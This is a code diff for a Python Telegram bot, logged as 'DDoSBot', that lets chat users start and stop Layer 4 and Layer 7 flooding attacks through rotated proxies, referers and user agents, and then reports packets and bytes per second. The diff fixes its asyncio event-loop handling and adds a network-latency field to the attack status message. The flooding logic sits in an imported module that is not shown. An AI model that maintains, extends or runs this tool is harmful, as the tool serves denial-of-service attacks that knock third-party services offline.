@@ -8,7 +8,7 @@ from attack_methods import Layer4Attack, Layer7Attack
 import json
 import logging
 import psutil
-from utils import humanbytes, format_time
+from utils import humanbytes, format_time, get_network_latency
 
 logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
 logger = logging.getLogger("DDoSBot")
@@ -22,6 +22,10 @@ proxies = set()
 message_ids = {}
 referers = []
 user_agents = []
+
+# Vòng lặp sự kiện toàn cục
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
 
 async def load_proxies():
     global proxies
@@ -65,6 +69,7 @@ def format_status(attack):
         f"📦 *Requests Sent*: `{attack.requests_sent}`\n"
         f"🚀 *PPS*: `{attack.requests_sent // max(1, int(elapsed_time))}`/s\n"
         f"📊 *BPS*: `{humanbytes(attack.bytes_sent // max(1, int(elapsed_time)))}`/s\n"
+        f"🌐 *Network*: `{get_network_latency()}`\n"
         f"🖥️ *CPU Usage*: `{psutil.cpu_percent()}%`\n"
         f"💾 *Memory Usage*: `{psutil.virtual_memory().percent}%`\n"
         f"🔗 *Proxies*: `{len(proxies)}`"
@@ -118,7 +123,7 @@ def attack(message):
         ), parse_mode="Markdown")
         message_ids[message.chat.id] = msg.message_id
 
-        asyncio.get_event_loop().create_task(attack.run())
+        loop.create_task(attack.run())
         attacks[message.chat.id] = attack
 
         async def update_status():
@@ -132,7 +137,7 @@ def attack(message):
             bot.edit_message_text(f"🛑 *Attack Stopped* 🛑\n📊 *Final Report*:\n{format_status(attack)}",
                                 chat_id=message.chat.id, message_id=message_ids[message.chat.id], parse_mode="Markdown")
 
-        asyncio.get_event_loop().create_task(update_status())
+        loop.create_task(update_status())
     except Exception as e:
         bot.reply_to(message, f"❌ *Error*: `{str(e)}`", parse_mode="Markdown")
 
@@ -148,17 +153,16 @@ def stop(message):
 def proxies_cmd(message):
     global proxies
     if not proxies:
-        asyncio.run(load_proxies())
+        loop.run_until_complete(load_proxies())
     bot.reply_to(message, f"🔗 *Working Proxies*: `{len(proxies)}`", parse_mode="Markdown")
 
-async def main():
-    await load_proxies()
+def main():
+    loop.run_until_complete(load_proxies())
     load_referers_and_user_agents()
     bot_thread = Thread(target=run_bot, daemon=True)
     bot_thread.start()
     logger.info("Bot started.")
-    while True:  # Giữ vòng lặp chính chạy
-        await asyncio.sleep(1)
+    loop.run_forever()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
